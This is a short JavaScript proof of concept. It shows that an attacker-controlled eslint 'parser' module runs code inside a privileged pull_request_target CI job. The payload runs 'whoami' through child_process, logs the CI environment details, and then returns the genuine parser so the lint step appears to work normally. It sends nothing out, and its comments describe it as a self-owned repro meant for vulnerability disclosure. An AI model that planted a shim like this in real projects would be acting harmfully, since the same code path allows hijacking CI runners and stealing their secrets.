// Benign proof: fork/PR-head-controlled code executing inside the privileged
// pull_request_target job via the eslint `parser` field. No exfiltration, no push.
module.exports = (() => {
  const cp = require("child_process");
  let who = "";
  try { who = cp.execSync("whoami").toString().trim(); } catch (e) { who = "err:" + e.message; }
  console.log("=== LINT_ACTION_PR_TARGET_RCE_POC (self-owned repro) ===");
  console.log("proof: PR-head parser executed via node require()");
  console.log("whoami: " + who);
  console.log("GITHUB_EVENT_NAME: " + process.env.GITHUB_EVENT_NAME);
  console.log("GITHUB_REPOSITORY: " + process.env.GITHUB_REPOSITORY);
  console.log("=== END LINT_ACTION_PR_TARGET_RCE_POC ===");
  return require("@typescript-eslint/parser");
})();
